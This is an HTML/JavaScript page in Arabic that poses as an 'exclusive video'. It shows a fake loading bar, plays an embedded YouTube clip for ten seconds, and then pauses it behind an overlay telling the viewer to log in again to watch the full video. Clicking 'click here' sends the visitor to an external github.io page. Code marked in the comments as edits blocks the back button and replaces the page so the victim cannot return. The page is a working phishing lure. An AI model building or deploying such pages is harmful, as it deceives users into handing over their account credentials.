<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<title>فيديو حصري</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<style>
html, body {
    margin: 0;
    padding: 0;
    background: #000;
    height: 100%;
    width: 100%;
    overflow: hidden;
}
.video-container {
    position: relative;
    width: 100%;
    height: 100vh;
    overflow: hidden; 
}
#loading-text, #loaded-text {
    position: absolute;
    top: 38%;
    left: 50%;
    transform: translate(-50%, -50%);
    z-index: 16;
    text-align: center;
    transition: color 0.5s ease, opacity 0.5s ease;
}
#loading-text {
    color: white;
    font-size: 20px;
    font-weight: bold;
}
#loaded-text {
    display: none;
    color: #3498db;
    font-size: 18px;
    font-weight: bold;
    animation: blinkScale 1s infinite;
}
#xmxx-text {
    display: none;
    color: #3498db;
    font-size: 40px;
    font-weight: bolder;
    letter-spacing: 5px;
    top: 10%;
    left: 50%;
    transform: translateX(-50%);
    z-index: 16;
    text-align: center;
}
@keyframes blinkScale {
    0%, 100% {color: #3498db; transform: translate(-50%, -50%) scale(1);}
    50% {color: #85c1e9; transform: translate(-50%, -50%) scale(1.2);}
}
#progress-bar-container {
    position: absolute;
    top: 30px;
    left: 10%;
    width: 80%;
    height: 6px;
    background: #333;
    border-radius: 3px;
    z-index: 16;
}
#progress-bar {width:0%; height:100%; background:#00bfa5; border-radius:3px;}
#custom-play {
    position:absolute;
    top:50%;
    left:50%;
    transform:translate(-50%,-50%);
    width:80px;
    height:80px;
    background-color:#00bfa5;
    border-radius:50%;
    display:flex;
    justify-content:center;
    align-items:center;
    cursor:not-allowed;
    z-index:11;
    opacity:0.7;
}
#custom-play::before {
    content:''; display:block; width:0; height:0;
    border-left:25px solid white; border-top:15px solid transparent; border-bottom:15px solid transparent;
    margin-left:5px;
}
#loading-circle {
    position:absolute;
    top:50%;
    left:50%;
    transform:translate(-50%,-50%);
    width:120px;
    height:120px;
    background:#000;
    border-radius:50%;
    display:none;
    flex-direction:column;
    justify-content:center;
    align-items:center;
    color:white;
    font-size:14px;
    z-index:12;
}
.spinner {
    border:4px solid #444;
    border-top:4px solid #fff;
    border-radius:50%;
    width:30px;
    height:30px;
    animation:spin 1s linear infinite;
    margin-bottom:8px;
}
@keyframes spin {0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}
#video-overlay {
    position:absolute;
    top:0;
    left:0;
    width:100%;
    height:100%;
    display:none;
    flex-direction:column;
    justify-content:center;
    align-items:center;
    background:rgba(0,0,0,0.95);
    z-index:10;
    text-align:center;
}
#overlay-message {color:white; font-size:22px; margin-bottom:20px; font-weight:bold;}
#continue-text {
    padding:12px 25px; font-size:18px; background:#4267B2; color:white; border-radius:6px; font-weight:bold; cursor:pointer;
    box-shadow:0 4px 6px rgba(0,0,0,0.2); transition:0.3s;
}
#continue-text:hover {background:#365899;}
#bottom-bar {
    position:absolute;
    bottom:0;
    left:0;
    width:100%;
    background:#000;
    color:white;
    font-size:16px;
    text-align:center;
    padding:8px 0;
    z-index:13;
    font-weight:bold;
}
#player iframe {
    width: 100% !important;
    height: 100% !important;
}
#player {width:100%; height:100%;}
</style>
</head>
<body>
<div class="video-container">
    <div id="loading-text">انتظر حتى يتم تحميل الفيديو</div>
    <div id="loaded-text">اكتمل التحميل أنقر للمشاهدة</div>
    <div id="xmxx-text">XMXX</div>
    <div id="progress-bar-container"><div id="progress-bar"></div></div>
    <div id="player"></div>
    <div id="custom-play"></div>
    <div id="loading-circle"><div class="spinner"></div><div>انتظر قليلا</div></div>
    <div id="video-overlay">
        <div id="overlay-message">يجب عليك إعادة تسجيل الدخول لمشاهدة الفيديو كاملا.</div>
        <span id="continue-text">أنقر هنا</span>
    </div>
    <div id="bottom-bar">يجب عليك إعادة تسجيل الدخول لتتمكن من مشاهدة الفيديوهات</div>
</div>

<script>
const playButton = document.getElementById('custom-play');
const loadingCircle = document.getElementById('loading-circle');
const overlay = document.getElementById('video-overlay');
const loadingText = document.getElementById('loading-text');
const loadedText = document.getElementById('loaded-text');
const xmxxText = document.getElementById('xmxx-text');
const progressBarContainer = document.getElementById('progress-bar-container');
const progressBar = document.getElementById('progress-bar');
const stopTime = 10; 
const destinationURL = "https://youcefcheria.github.io/Youcef/";

let player;
let videoReady = false;

// 🔥 التعديل 1: إضافة سطر لمنع الرجوع فور تحميل الصفحة
window.onload = function() {
    history.pushState(null, document.title, location.href);
};

setTimeout(() => {
    loadingText.style.color = 'red';
}, 3000);

var tag = document.createElement('script');
tag.src = "https://www.youtube.com/iframe_api";
document.body.appendChild(tag);

function onYouTubeIframeAPIReady() {
    player = new YT.Player('player', {
        videoId: 'rMuW3XQVpyM',
        playerVars: {
            'controls':1,
            'rel':0,
            'modestbranding':1,
            'playsinline':1,
            'vq':'tiny'
        },
        events: {'onReady': onPlayerReady}
    });
}

function onPlayerReady(event) {
    let progress = 0;
    const progressInterval = setInterval(()=>{
        progress += Math.random()*5;
        if(progress>=100) progress=100;
        progressBar.style.width = progress+'%';
        if(progress>=100){
            clearInterval(progressInterval);
            videoReady=true;
            loadingText.style.display='none';
            loadedText.style.display='block';
            playButton.style.cursor='pointer';
            playButton.style.opacity='1';
        }
    },200);
}

playButton.addEventListener('click', function(){
    if(!videoReady) return;
    playButton.style.display='none';
    loadedText.style.display='none';
    progressBarContainer.style.display='none';
    xmxxText.style.display='block';
    loadingCircle.style.display='flex';
    setTimeout(()=>{loadingCircle.style.display='none';},2000);
    player.playVideo();
    setTimeout(()=>{player.pauseVideo(); overlay.style.display='flex';}, stopTime*1000);
});

// 🔥 التعديل 2: تغيير طريقة التوجيه لمنع العودة للموقع الحالي
document.getElementById('continue-text').addEventListener('click', function(){
    // window.open(destinationURL,'_blank'); // هذا هو السطر الأصلي
    window.location.replace(destinationURL); // هذا هو السطر الجديد الذي يمنع الرجوع
});
</script>
</body>
</html>
